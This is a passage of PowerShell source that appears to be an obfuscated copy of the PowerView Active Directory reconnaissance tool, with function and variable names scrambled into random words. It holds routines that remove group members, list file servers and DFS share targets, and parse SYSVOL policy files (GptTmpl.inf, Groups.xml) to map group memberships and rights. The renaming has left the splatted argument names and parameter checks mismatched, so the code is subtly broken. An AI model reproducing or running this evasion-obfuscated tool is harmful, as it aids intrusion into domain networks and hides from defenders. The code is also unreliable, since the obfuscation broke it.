            'Identity' = $phaEiMpW99
        }
        if ($PSBoundParameters['Domain']) { $VAidWYXW99['Domain'] = $gddrYpaX99 }
        if ($PSBoundParameters['Credential']) { $VAidWYXW99['Credential'] = $xjRyyQze99 }
        $bdFyeoyf99 = optics @ContextArguments
        if ($bdFyeoyf99) {
            try {
                $Group = [System.DirectoryServices.AccountManagement.GroupPrincipal]::FindByIdentity($bdFyeoyf99.Context, $bdFyeoyf99.Identity)
            }
            catch {
                Write-Warning "[sleeks] Error finding the group identity '$phaEiMpW99' : $_"
            }
        }
    }
    PROCESS {
        if ($Group) {
            ForEach ($FEdwNfjR99 in $gwHuJhvi99) {
                if ($FEdwNfjR99 -match '.+\\.+') {
                    $VAidWYXW99['Identity'] = $FEdwNfjR99
                    $AeIFkklx99 = optics @ContextArguments
                    if ($AeIFkklx99) {
                        $PndMyEmp99 = $AeIFkklx99.Identity
                    }
                }
                else {
                    $AeIFkklx99 = $bdFyeoyf99
                    $PndMyEmp99 = $FEdwNfjR99
                }
                Write-Verbose "[sleeks] Removing member '$FEdwNfjR99' from group '$phaEiMpW99'"
                $FEdwNfjR99 = [System.DirectoryServices.AccountManagement.Principal]::FindByIdentity($AeIFkklx99.Context, $PndMyEmp99)
                $Group.Members.Remove($FEdwNfjR99)
                $Group.Save()
            }
        }
    }
}
function outperform {
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType([String])]
    [CmdletBinding()]
    Param(
        [Parameter( ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [ValidateNotNullOrEmpty()]
        [Alias('DomainName', 'Name')]
        [String[]]
        $gddrYpaX99,
        [ValidateNotNullOrEmpty()]
        [Alias('Filter')]
        [String]
        $vqxjYeAS99,
        [ValidateNotNullOrEmpty()]
        [Alias('ADSPath')]
        [String]
        $kNJfXSCC99,
        [ValidateNotNullOrEmpty()]
        [Alias('DomainController')]
        [String]
        $GejzMkbd99,
        [ValidateSet('Base', 'OneLevel', 'Subtree')]
        [String]
        $yuycROvu99 = 'Subtree',
        [ValidateRange(1, 10000)]
        [Int]
        $vUSyLBJJ99 = 200,
        [ValidateRange(1, 10000)]
        [Int]
        $cNGaYdSy99,
        [Switch]
        $kQTByXSX99,
        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $xjRyyQze99 = [Management.Automation.PSCredential]::Empty
    )
    BEGIN {
        function teetotalers {
            Param([String]$Path)
            if ($Path -and ($Path.split('\\').Count -ge 3)) {
                $Temp = $Path.split('\\')[2]
                if ($Temp -and ($Temp -ne '')) {
                    $Temp
                }
            }
        }
        $VrICpjXS99 = @{
            'LDAPFilter' = '(&(samAccountType=805306368)(!(userAccountControl:1.2.840.113556.1.4.803:=2))(|(homedirectory=*)(scriptpath=*)(profilepath=*)))'
            'Properties' = 'homedirectory,scriptpath,profilepath'
        }
        if ($PSBoundParameters['SearchBase']) { $VrICpjXS99['SearchBase'] = $kNJfXSCC99 }
        if ($PSBoundParameters['Server']) { $VrICpjXS99['Server'] = $GejzMkbd99 }
        if ($PSBoundParameters['SearchScope']) { $VrICpjXS99['SearchScope'] = $yuycROvu99 }
        if ($PSBoundParameters['ResultPageSize']) { $VrICpjXS99['ResultPageSize'] = $vUSyLBJJ99 }
        if ($PSBoundParameters['ServerTimeLimit']) { $VrICpjXS99['ServerTimeLimit'] = $cNGaYdSy99 }
        if ($PSBoundParameters['Tombstone']) { $VrICpjXS99['Tombstone'] = $kQTByXSX99 }
        if ($PSBoundParameters['Credential']) { $VrICpjXS99['Credential'] = $xjRyyQze99 }
    }
    PROCESS {
        if ($PSBoundParameters['Domain']) {
            ForEach ($udnfiLvJ99 in $gddrYpaX99) {
                $VrICpjXS99['Domain'] = $udnfiLvJ99
                $fZeXaaEw99 = indenturing @SearcherArguments
                $(ForEach($JtlxEthJ99 in $fZeXaaEw99.FindAll()) {if ($JtlxEthJ99.Properties['homedirectory']) {teetotalers($JtlxEthJ99.Properties['homedirectory'])}if ($JtlxEthJ99.Properties['scriptpath']) {teetotalers($JtlxEthJ99.Properties['scriptpath'])}if ($JtlxEthJ99.Properties['profilepath']) {teetotalers($JtlxEthJ99.Properties['profilepath'])}}) | Sort-Object -Unique
            }
        }
        else {
            $fZeXaaEw99 = indenturing @SearcherArguments
            $(ForEach($JtlxEthJ99 in $fZeXaaEw99.FindAll()) {if ($JtlxEthJ99.Properties['homedirectory']) {teetotalers($JtlxEthJ99.Properties['homedirectory'])}if ($JtlxEthJ99.Properties['scriptpath']) {teetotalers($JtlxEthJ99.Properties['scriptpath'])}if ($JtlxEthJ99.Properties['profilepath']) {teetotalers($JtlxEthJ99.Properties['profilepath'])}}) | Sort-Object -Unique
        }
    }
}
function enfranchisement {
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSUseDeclaredVarsMoreThanAssignments', '')]
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSUseApprovedVerbs', '')]
    [OutputType('System.Management.Automation.PSCustomObject')]
    [CmdletBinding()]
    Param(
        [Parameter( ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [ValidateNotNullOrEmpty()]
        [Alias('DomainName', 'Name')]
        [String[]]
        $gddrYpaX99,
        [ValidateNotNullOrEmpty()]
        [Alias('ADSPath')]
        [String]
        $kNJfXSCC99,
        [ValidateNotNullOrEmpty()]
        [Alias('DomainController')]
        [String]
        $GejzMkbd99,
        [ValidateSet('Base', 'OneLevel', 'Subtree')]
        [String]
        $yuycROvu99 = 'Subtree',
        [ValidateRange(1, 10000)]
        [Int]
        $vUSyLBJJ99 = 200,
        [ValidateRange(1, 10000)]
        [Int]
        $cNGaYdSy99,
        [Switch]
        $kQTByXSX99,
        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $xjRyyQze99 = [Management.Automation.PSCredential]::Empty,
        [ValidateSet('All', 'V1', '1', 'V2', '2')]
        [String]
        $RqWyEIvE99 = 'All'
    )
    BEGIN {
        $VrICpjXS99 = @{}
        if ($PSBoundParameters['SearchBase']) { $VrICpjXS99['SearchBase'] = $kNJfXSCC99 }
        if ($PSBoundParameters['Server']) { $VrICpjXS99['Server'] = $GejzMkbd99 }
        if ($PSBoundParameters['SearchScope']) { $VrICpjXS99['SearchScope'] = $yuycROvu99 }
        if ($PSBoundParameters['ResultPageSize']) { $VrICpjXS99['ResultPageSize'] = $vUSyLBJJ99 }
        if ($PSBoundParameters['ServerTimeLimit']) { $VrICpjXS99['ServerTimeLimit'] = $cNGaYdSy99 }
        if ($PSBoundParameters['Tombstone']) { $VrICpjXS99['Tombstone'] = $kQTByXSX99 }
        if ($PSBoundParameters['Credential']) { $VrICpjXS99['Credential'] = $xjRyyQze99 }
        function Fredric {
            [CmdletBinding()]
            Param(
                [Byte[]]
                $Pkt
            )
            $bin = $Pkt
            $ExwDkDMQ99 = [bitconverter]::ToUInt32($bin[0..3],0)
            $XDwPdXFj99 = [bitconverter]::ToUInt32($bin[4..7],0)
            $MmzaDoyA99 = 8
            $iFrXGPso99 = @()
            for($i=1; $i -le $XDwPdXFj99; $i++){
                $IzMlfJGS99 = $MmzaDoyA99
                $ZTYqVZgu99 = $MmzaDoyA99 + 1
                $yjQzkTnA99 = [bitconverter]::ToUInt16($bin[$IzMlfJGS99..$ZTYqVZgu99],0)
                $gmdFnOqU99 = $ZTYqVZgu99 + 1
                $UTbIokBx99 = $gmdFnOqU99 + $yjQzkTnA99 - 1
                $FrrRjjyi99 = [System.Text.Encoding]::Unicode.GetString($bin[$gmdFnOqU99..$UTbIokBx99])
                $VqnIoMMJ99 = $UTbIokBx99 + 1
                $pspoXyvh99 = $VqnIoMMJ99 + 3
                $aLtGyLeX99 = [bitconverter]::ToUInt32($bin[$VqnIoMMJ99..$pspoXyvh99],0)
                $yLbXciqV99 = $pspoXyvh99 + 1
                $eKlHfiSU99 = $yLbXciqV99 + $aLtGyLeX99 - 1
                $WFBAQfKh99 = $bin[$yLbXciqV99..$eKlHfiSU99]
                switch -wildcard ($FrrRjjyi99) {
                    "\siteroot" {  }
                    "\domainroot*" {
                        $bReqVtxN99 = 0
                        $YFojDKyH99 = 15
                        $jRJEtHyx99 = [byte[]]$WFBAQfKh99[$bReqVtxN99..$YFojDKyH99]
                        $guid = New-Object Guid(,$jRJEtHyx99) # should match $ecQBSKQw99
                        $KbvokpCX99 = $YFojDKyH99 + 1
                        $sKCaGWBm99 = $KbvokpCX99 + 1
                        $xTugvPFM99 = [bitconverter]::ToUInt16($WFBAQfKh99[$KbvokpCX99..$sKCaGWBm99],0)
                        $LoPwyqiF99 = $sKCaGWBm99 + 1
                        $urfJXmda99 = $LoPwyqiF99 + $xTugvPFM99 - 1
                        $jekqpjXR99 = [System.Text.Encoding]::Unicode.GetString($WFBAQfKh99[$LoPwyqiF99..$urfJXmda99])
                        $aUyNVBVo99 = $urfJXmda99 + 1
                        $UfdKOoBu99 = $aUyNVBVo99 + 1
                        $IskSWbnM99 = [bitconverter]::ToUInt16($WFBAQfKh99[$aUyNVBVo99..$UfdKOoBu99],0)
                        $KERndabZ99 = $UfdKOoBu99 + 1
                        $dPVPTcCq99 = $KERndabZ99 + $IskSWbnM99 - 1
                        $vXuqfLNg99 = [System.Text.Encoding]::Unicode.GetString($WFBAQfKh99[$KERndabZ99..$dPVPTcCq99])
                        $xJcHIJBJ99 = $dPVPTcCq99 + 1
                        $ddLdUknl99 = $xJcHIJBJ99 + 3
                        $type = [bitconverter]::ToUInt32($WFBAQfKh99[$xJcHIJBJ99..$ddLdUknl99],0)
                        $phPhvPBV99 = $ddLdUknl99 + 1
                        $OggBcYVg99 = $phPhvPBV99 + 3
                        $state = [bitconverter]::ToUInt32($WFBAQfKh99[$phPhvPBV99..$OggBcYVg99],0)
                        $jHAbeeQk99 = $OggBcYVg99 + 1
                        $ThPMzgjt99 = $jHAbeeQk99 + 1
                        $QawsHZID99 = [bitconverter]::ToUInt16($WFBAQfKh99[$jHAbeeQk99..$ThPMzgjt99],0)
                        $wdshfUnv99 = $ThPMzgjt99 + 1
                        $dOmqoxsP99 = $wdshfUnv99 + $QawsHZID99 - 1
                        if ($QawsHZID99 -gt 0)  {
                            $RvexPODq99 = [System.Text.Encoding]::Unicode.GetString($WFBAQfKh99[$wdshfUnv99..$dOmqoxsP99])
                        }
                        $ZuLKSfZJ99 = $dOmqoxsP99 + 1
                        $smlLpDGh99 = $ZuLKSfZJ99 + 7
                        $qTDUwmfz99 = $WFBAQfKh99[$ZuLKSfZJ99..$smlLpDGh99] #dword lowDateTime #dword highdatetime
                        $hNheomfA99 = $smlLpDGh99 + 1
                        $BfuRslGT99 = $hNheomfA99 + 7
                        $TNiigjhq99 = $WFBAQfKh99[$hNheomfA99..$BfuRslGT99]
                        $qWuGTEcO99 = $BfuRslGT99 + 1
                        $CehvnzTw99 = $qWuGTEcO99 + 7
                        $SDBQaBxE99 = $WFBAQfKh99[$qWuGTEcO99..$CehvnzTw99]
                        $gYtJdErz99 = $CehvnzTw99  + 1
                        $JwEuaylO99 = $gYtJdErz99 + 3
                        $RqWyEIvE99 = [bitconverter]::ToUInt32($WFBAQfKh99[$gYtJdErz99..$JwEuaylO99],0)
                        $KojGrgqF99 = $JwEuaylO99 + 1
                        $sPApmxyQ99 = $KojGrgqF99 + 3
                        $uhCUlPGD99 = [bitconverter]::ToUInt32($WFBAQfKh99[$KojGrgqF99..$sPApmxyQ99],0)
                        $axUTHoHY99 = $sPApmxyQ99 + 1
                        $TMkWewIb99 = $axUTHoHY99 + $uhCUlPGD99 - 1
                        $wQPIsanA99 = $WFBAQfKh99[$axUTHoHY99..$TMkWewIb99]
                        $eSWsoGQX99 = $TMkWewIb99 + 1
                        $KHRNUKYw99 = $eSWsoGQX99 + 3
                        $HCFAEEmn99 = [bitconverter]::ToUInt32($WFBAQfKh99[$eSWsoGQX99..$KHRNUKYw99],0)
                        $ZpfGXLzl99 = $KHRNUKYw99 + 1
                        $QCjzhaeP99 = $ZpfGXLzl99 + $HCFAEEmn99 - 1
                        $XQYTuErK99 = $WFBAQfKh99[$ZpfGXLzl99..$QCjzhaeP99]
                        $AzzuZIFo99 = $QCjzhaeP99 + 1
                        $uomrhFOC99 = $AzzuZIFo99 + 3
                        $HMlMhOJL99 = [bitconverter]::ToUInt32($WFBAQfKh99[$AzzuZIFo99..$uomrhFOC99],0)
                        $JTRmpqsI99 = 0
                        $SmBnCUaY99 = $JTRmpqsI99 + 3
                        $VJNTxCPI99 = [bitconverter]::ToUInt32($wQPIsanA99[$JTRmpqsI99..$SmBnCUaY99],0)
                        $iYxlxCjG99 = $SmBnCUaY99 + 1
                        for($j=1; $j -le $VJNTxCPI99; $j++){
                            $MycNJKRw99 = $iYxlxCjG99
                            $ClzHVqaF99 = $MycNJKRw99 + 3
                            $cSJmxNhZ99 = [bitconverter]::ToUInt32($wQPIsanA99[$MycNJKRw99..$ClzHVqaF99],0)
                            $RQNnqmBz99 = $ClzHVqaF99 + 1
                            $mGlmXuiY99 = $RQNnqmBz99 + 7
                            $LQEukrpK99 = $wQPIsanA99[$RQNnqmBz99..$mGlmXuiY99]
                            $JmYXgmqS99 = $mGlmXuiY99 + 1
                            $rPXsQHYW99 = $JmYXgmqS99 + 3
                            $ZDxUcWDM99 = [bitconverter]::ToUInt32($wQPIsanA99[$JmYXgmqS99..$rPXsQHYW99],0)
                            $lHsbYyWt99 = $rPXsQHYW99 + 1
                            $jUwRNDJg99 = $lHsbYyWt99 + 3
                            $yqqNOeuA99 = [bitconverter]::ToUInt32($wQPIsanA99[$lHsbYyWt99..$jUwRNDJg99],0)
                            $UjeDxPtE99 = $jUwRNDJg99 + 1
                            $zGQKtEmZ99 = $UjeDxPtE99 + 1
                            $vnrEhPrf99 = [bitconverter]::ToUInt16($wQPIsanA99[$UjeDxPtE99..$zGQKtEmZ99],0)
                            $lDNEkZvX99 = $zGQKtEmZ99 + 1
                            $LfqJZWXu99 = $lDNEkZvX99 + $vnrEhPrf99 - 1
                            $cWEBNPSU99 = [System.Text.Encoding]::Unicode.GetString($wQPIsanA99[$lDNEkZvX99..$LfqJZWXu99])
                            $AWpLLGdU99 = $LfqJZWXu99 + 1
                            $vPJjHwuN99 = $AWpLLGdU99 + 1
                            $PjlPygQU99 = [bitconverter]::ToUInt16($wQPIsanA99[$AWpLLGdU99..$vPJjHwuN99],0)
                            $BjdeDtov99 = $vPJjHwuN99 + 1
                            $ZlXYlDuL99 = $BjdeDtov99 + $PjlPygQU99 - 1
                            $JeTRRDXf99 = [System.Text.Encoding]::Unicode.GetString($wQPIsanA99[$BjdeDtov99..$ZlXYlDuL99])
                            $OjVtfgYD99 += "\\$cWEBNPSU99\$JeTRRDXf99"
                            $iYxlxCjG99 = $ZlXYlDuL99 + 1
                        }
                    }
                }
                $MmzaDoyA99 = $eKlHfiSU99 + 1
                $vavwDTfE99 = @{
                    'Name' = $FrrRjjyi99
                    'Prefix' = $jekqpjXR99
                    'TargetList' = $OjVtfgYD99
                }
                $iFrXGPso99 += New-Object -TypeName PSObject -Property $vavwDTfE99
                $jekqpjXR99 = $Null
                $FrrRjjyi99 = $Null
                $OjVtfgYD99 = $Null
            }
            $jQwFJpTk99 = @()
            $iFrXGPso99 | ForEach-Object {
                if ($_.TargetList) {
                    $_.TargetList | ForEach-Object {
                        $jQwFJpTk99 += $_.split('\')[2]
                    }
                }
            }
            $jQwFJpTk99
        }
        function gun {
            [CmdletBinding()]
            Param(
                [String]
                $gddrYpaX99,
                [String]
                $kNJfXSCC99,
                [String]
                $GejzMkbd99,
                [String]
                $yuycROvu99 = 'Subtree',
                [Int]
                $vUSyLBJJ99 = 200,
                [Int]
                $cNGaYdSy99,
                [Switch]
                $kQTByXSX99,
                [Management.Automation.PSCredential]
                [Management.Automation.CredentialAttribute()]
                $xjRyyQze99 = [Management.Automation.PSCredential]::Empty
            )
            $RWrAlwKm99 = indenturing @PSBoundParameters
            if ($RWrAlwKm99) {
                $ynmifkVF99 = @()
                $RWrAlwKm99.filter = '(&(objectClass=fTDfs))'
                try {
                    $jAOXTyAF99 = $RWrAlwKm99.FindAll()
                    $jAOXTyAF99 | Where-Object {$_} | ForEach-Object {
                        $PjvsRTzX99 = $_.Properties
                        $mcNpwSjq99 = $PjvsRTzX99.remoteservername
                        $Pkt = $PjvsRTzX99.pkt
                        $ynmifkVF99 += $mcNpwSjq99 | ForEach-Object {
                            try {
                                if ( $_.Contains('\') ) {
                                    New-Object -TypeName PSObject -Property @{'Name'=$PjvsRTzX99.name[0];'RemoteServerName'=$_.split('\')[2]}
                                }
                            }
                            catch {
                                Write-Verbose "[enfranchisement] gun error in parsing DFS share : $_"
                            }
                        }
                    }
                    if ($jAOXTyAF99) {
                        try { $jAOXTyAF99.dispose() }
                        catch {
                            Write-Verbose "[enfranchisement] gun error disposing of the Results object: $_"
                        }
                    }
                    $RWrAlwKm99.dispose()
                    if ($pkt -and $pkt[0]) {
                        Fredric $pkt[0] | ForEach-Object {
                            if ($_ -ne 'null') {
                                New-Object -TypeName PSObject -Property @{'Name'=$PjvsRTzX99.name[0];'RemoteServerName'=$_}
                            }
                        }
                    }
                }
                catch {
                    Write-Warning "[enfranchisement] gun error : $_"
                }
                $ynmifkVF99 | Sort-Object -Unique -Property 'RemoteServerName'
            }
        }
        function flutists {
            [CmdletBinding()]
            Param(
                [String]
                $gddrYpaX99,
                [String]
                $kNJfXSCC99,
                [String]
                $GejzMkbd99,
                [String]
                $yuycROvu99 = 'Subtree',
                [Int]
                $vUSyLBJJ99 = 200,
                [Int]
                $cNGaYdSy99,
                [Switch]
                $kQTByXSX99,
                [Management.Automation.PSCredential]
                [Management.Automation.CredentialAttribute()]
                $xjRyyQze99 = [Management.Automation.PSCredential]::Empty
            )
            $RWrAlwKm99 = indenturing @PSBoundParameters
            if ($RWrAlwKm99) {
                $ynmifkVF99 = @()
                $RWrAlwKm99.filter = '(&(objectClass=msDFS-Linkv2))'
                $Null = $RWrAlwKm99.PropertiesToLoad.AddRange(('msdfs-linkpathv2','msDFS-TargetListv2'))
                try {
                    $jAOXTyAF99 = $RWrAlwKm99.FindAll()
                    $jAOXTyAF99 | Where-Object {$_} | ForEach-Object {
                        $PjvsRTzX99 = $_.Properties
                        $OjVtfgYD99 = $PjvsRTzX99.'msdfs-targetlistv2'[0]
                        $xml = [xml][System.Text.Encoding]::Unicode.GetString($OjVtfgYD99[2..($OjVtfgYD99.Length-1)])
                        $ynmifkVF99 += $xml.targets.ChildNodes | ForEach-Object {
                            try {
                                $khyCujba99 = $_.InnerText
                                if ( $khyCujba99.Contains('\') ) {
                                    $TgFQfLGB99 = $khyCujba99.split('\')[3]
                                    $HsbkIJLD99 = $PjvsRTzX99.'msdfs-linkpathv2'[0]
                                    New-Object -TypeName PSObject -Property @{'Name'="$TgFQfLGB99$HsbkIJLD99";'RemoteServerName'=$khyCujba99.split('\')[2]}
                                }
                            }
                            catch {
                                Write-Verbose "[enfranchisement] flutists error in parsing target : $_"
                            }
                        }
                    }
                    if ($jAOXTyAF99) {
                        try { $jAOXTyAF99.dispose() }
                        catch {
                            Write-Verbose "[enfranchisement] Error disposing of the Results object: $_"
                        }
                    }
                    $RWrAlwKm99.dispose()
                }
                catch {
                    Write-Warning "[enfranchisement] flutists error : $_"
                }
                $ynmifkVF99 | Sort-Object -Unique -Property 'RemoteServerName'
            }
        }
    }
    PROCESS {
        $ynmifkVF99 = @()
        if ($PSBoundParameters['Domain']) {
            ForEach ($udnfiLvJ99 in $gddrYpaX99) {
                $VrICpjXS99['Domain'] = $udnfiLvJ99
                if ($RqWyEIvE99 -match 'all|1') {
                    $ynmifkVF99 += gun @SearcherArguments
                }
                if ($RqWyEIvE99 -match 'all|2') {
                    $ynmifkVF99 += flutists @SearcherArguments
                }
            }
        }
        else {
            if ($RqWyEIvE99 -match 'all|1') {
                $ynmifkVF99 += gun @SearcherArguments
            }
            if ($RqWyEIvE99 -match 'all|2') {
                $ynmifkVF99 += flutists @SearcherArguments
            }
        }
        $ynmifkVF99 | Sort-Object -Property ('RemoteServerName','Name') -Unique
    }
}
function expending {
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType([Hashtable])]
    [CmdletBinding()]
    Param (
        [Parameter(Mandatory = $True, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('gpcfilesyspath', 'Path')]
        [String]
        $TYbdeGZR99,
        [Switch]
        $THEDaoqz99,
        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $xjRyyQze99 = [Management.Automation.PSCredential]::Empty
    )
    BEGIN {
        $Cilfqpwi99 = @{}
    }
    PROCESS {
        try {
            if (($TYbdeGZR99 -Match '\\\\.*\\.*') -and ($PSBoundParameters['Credential'])) {
                $osXTAYsI99 = "\\$((New-Object System.Uri($TYbdeGZR99)).Host)\SYSVOL"
                if (-not $Cilfqpwi99[$osXTAYsI99]) {
                    unhooking -Path $osXTAYsI99 -xjRyyQze99 $xjRyyQze99
                    $Cilfqpwi99[$osXTAYsI99] = $True
                }
            }
            $UrGSGtqY99 = $TYbdeGZR99
            if (-not $UrGSGtqY99.EndsWith('.inf')) {
                $UrGSGtqY99 += '\MACHINE\Microsoft\Windows NT\SecEdit\GptTmpl.inf'
            }
            Write-Verbose "[expending] Parsing GptTmplPath: $UrGSGtqY99"
            if ($PSBoundParameters['OutputObject']) {
                $hHPXZuGR99 = devilment -Path $UrGSGtqY99 -THEDaoqz99 -ErrorAction Stop
                if ($hHPXZuGR99) {
                    $hHPXZuGR99 | Add-Member Noteproperty 'Path' $UrGSGtqY99
                    $hHPXZuGR99
                }
            }
            else {
                $hHPXZuGR99 = devilment -Path $UrGSGtqY99 -ErrorAction Stop
                if ($hHPXZuGR99) {
                    $hHPXZuGR99['Path'] = $UrGSGtqY99
                    $hHPXZuGR99
                }
            }
        }
        catch {
            Write-Verbose "[expending] Error parsing $UrGSGtqY99 : $_"
        }
    }
    END {
        $Cilfqpwi99.Keys | ForEach-Object { shoeing -Path $_ }
    }
}
function loadstone {
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType('PowerView.GroupsXML')]
    [CmdletBinding()]
    Param (
        [Parameter(Mandatory = $True, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('Path')]
        [String]
        $QgkdhHSw99,
        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $xjRyyQze99 = [Management.Automation.PSCredential]::Empty
    )
    BEGIN {
        $Cilfqpwi99 = @{}
    }
    PROCESS {
        try {
            if (($QgkdhHSw99 -Match '\\\\.*\\.*') -and ($PSBoundParameters['Credential'])) {
                $osXTAYsI99 = "\\$((New-Object System.Uri($QgkdhHSw99)).Host)\SYSVOL"
                if (-not $Cilfqpwi99[$osXTAYsI99]) {
                    unhooking -Path $osXTAYsI99 -xjRyyQze99 $xjRyyQze99
                    $Cilfqpwi99[$osXTAYsI99] = $True
                }
            }
            [XML]$xJGIAfod99 = Get-Content -Path $QgkdhHSw99 -ErrorAction Stop
            $xJGIAfod99 | Select-Xml "/Groups/Group" | Select-Object -ExpandProperty node | ForEach-Object {
                $KegVfEPD99 = $_.Properties.groupName
                $CAsXSzun99 = $_.Properties.groupSid
                if (-not $CAsXSzun99) {
                    if ($KegVfEPD99 -match 'Administrators') {
                        $CAsXSzun99 = 'S-1-5-32-544'
                    }
                    elseif ($KegVfEPD99 -match 'Remote Desktop') {
                        $CAsXSzun99 = 'S-1-5-32-555'
                    }
                    elseif ($KegVfEPD99 -match 'Guests') {
                        $CAsXSzun99 = 'S-1-5-32-546'
                    }
                    else {
                        if ($PSBoundParameters['Credential']) {
                            $CAsXSzun99 = remissions -sskuJSha99 $KegVfEPD99 -xjRyyQze99 $xjRyyQze99
                        }
                        else {
                            $CAsXSzun99 = remissions -sskuJSha99 $KegVfEPD99
                        }
                    }
                }
                $gwHuJhvi99 = $_.Properties.members | Select-Object -ExpandProperty Member | Where-Object { $_.action -match 'ADD' } | ForEach-Object {
                    if ($_.sid) { $_.sid }
                    else { $_.name }
                }
                if ($gwHuJhvi99) {
                    if ($_.filters) {
                        $TBiCFkSC99 = $_.filters.GetEnumerator() | ForEach-Object {
                            New-Object -TypeName PSObject -Property @{'Type' = $_.LocalName;'Value' = $_.name}
                        }
                    }
                    else {
                        $TBiCFkSC99 = $Null
                    }
                    if ($gwHuJhvi99 -isnot [System.Array]) { $gwHuJhvi99 = @($gwHuJhvi99) }
                    $HqHEZBfE99 = New-Object PSObject
                    $HqHEZBfE99 | Add-Member Noteproperty 'GPOPath' $AsyjijFE99
                    $HqHEZBfE99 | Add-Member Noteproperty 'Filters' $TBiCFkSC99
                    $HqHEZBfE99 | Add-Member Noteproperty 'GroupName' $KegVfEPD99
                    $HqHEZBfE99 | Add-Member Noteproperty 'GroupSID' $CAsXSzun99
                    $HqHEZBfE99 | Add-Member Noteproperty 'GroupMemberOf' $Null
                    $HqHEZBfE99 | Add-Member Noteproperty 'GroupMembers' $gwHuJhvi99
                    $HqHEZBfE99.PSObject.TypeNames.Insert(0, 'PowerView.GroupsXML')
                    $HqHEZBfE99
                }
            }
        }
        catch {
            Write-Verbose "[loadstone] Error parsing $AsyjijFE99 : $_"
        }
    }
    END {
        $Cilfqpwi99.Keys | ForEach-Object { shoeing -Path $_ }
    }
}
function funereal {
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSUseDeclaredVarsMoreThanAssignments', '')]
    [OutputType('PowerView.GPO')]
    [OutputType('PowerView.GPO.Raw')]
    [CmdletBinding(DefaultParameterSetName = 'None')]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('DistinguishedName', 'SamAccountName', 'Name')]
        [String[]]
        $phaEiMpW99,
        [Parameter(ParameterSetName = 'ComputerIdentity')]
        [Alias('ComputerName')]
        [ValidateNotNullOrEmpty()]
        [String]
        $IvLqKyXl99,
        [Parameter(ParameterSetName = 'UserIdentity')]
        [Alias('UserName')]
        [ValidateNotNullOrEmpty()]
        [String]
        $PndMyEmp99,
        [ValidateNotNullOrEmpty()]
        [String]
        $gddrYpaX99,
        [ValidateNotNullOrEmpty()]
        [Alias('Filter')]
        [String]
        $vqxjYeAS99,
        [ValidateNotNullOrEmpty()]
        [String[]]
        $PjvsRTzX99,
        [ValidateNotNullOrEmpty()]
        [Alias('ADSPath')]
        [String]
        $kNJfXSCC99,
        [ValidateNotNullOrEmpty()]
        [Alias('DomainController')]
        [String]
        $GejzMkbd99,
        [ValidateSet('Base', 'OneLevel', 'Subtree')]
        [String]
        $yuycROvu99 = 'Subtree',
        [ValidateRange(1, 10000)]
        [Int]
        $vUSyLBJJ99 = 200,
        [ValidateRange(1, 10000)]
        [Int]
        $cNGaYdSy99,
        [ValidateSet('Dacl', 'Group', 'None', 'Owner', 'Sacl')]
        [String]
        $VnyrBvDm99,
        [Switch]
        $kQTByXSX99,
        [Alias('ReturnOne')]
        [Switch]
        $DiGVDgqd99,
        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $xjRyyQze99 = [Management.Automation.PSCredential]::Empty,
        [Switch]
        $Raw
    )
    BEGIN {
        $VrICpjXS99 = @{}
        if ($PSBoundParameters['Domain']) { $VrICpjXS99['Domain'] = $gddrYpaX99 }
        if ($PSBoundParameters['Properties']) { $VrICpjXS99['Properties'] = $PjvsRTzX99 }
        if ($PSBoundParameters['SearchBase']) { $VrICpjXS99['SearchBase'] = $kNJfXSCC99 }
        if ($PSBoundParameters['Server']) { $VrICpjXS99['Server'] = $GejzMkbd99 }
        if ($PSBoundParameters['SearchScope']) { $VrICpjXS99['SearchScope'] = $yuycROvu99 }
        if ($PSBoundParameters['ResultPageSize']) { $VrICpjXS99['ResultPageSize'] = $vUSyLBJJ99 }
        if ($PSBoundParameters['ServerTimeLimit']) { $VrICpjXS99['ServerTimeLimit'] = $cNGaYdSy99 }
        if ($PSBoundParameters['SecurityMasks']) { $VrICpjXS99['SecurityMasks'] = $VnyrBvDm99 }
        if ($PSBoundParameters['Tombstone']) { $VrICpjXS99['Tombstone'] = $kQTByXSX99 }
        if ($PSBoundParameters['Credential']) { $VrICpjXS99['Credential'] = $xjRyyQze99 }
        $gBhORdXe99 = indenturing @SearcherArguments
    }
    PROCESS {
        if ($gBhORdXe99) {
            if ($PSBoundParameters['ComputerIdentity'] -or $PSBoundParameters['UserIdentity']) {
                $RLzlYNrw99 = @()
                if ($VrICpjXS99['Properties']) {
                    $gIZECdbV99 = $VrICpjXS99['Properties']
                }
                $VrICpjXS99['Properties'] = 'distinguishedname,dnshostname'
                $kungVfvV99 = $Null
                if ($PSBoundParameters['ComputerIdentity']) {
                    $VrICpjXS99['Identity'] = $IvLqKyXl99
                    $zNIilCKh99 = pickerels @SearcherArguments -DiGVDgqd99 | Select-Object -First 1
                    if(-not $zNIilCKh99) {
                        Write-Verbose "[funereal] Computer '$IvLqKyXl99' not found!"
                    }
                    $MEFGOmzQ99 = $zNIilCKh99.distinguishedname
                    $kungVfvV99 = $zNIilCKh99.dnshostname
                }
                else {
                    $VrICpjXS99['Identity'] = $PndMyEmp99
                    $User = wasteland @SearcherArguments -DiGVDgqd99 | Select-Object -First 1
                    if(-not $User) {
                        Write-Verbose "[funereal] User '$PndMyEmp99' not found!"
                    }
                    $MEFGOmzQ99 = $User.distinguishedname
                }
                $UnVGlaOI99 = @()
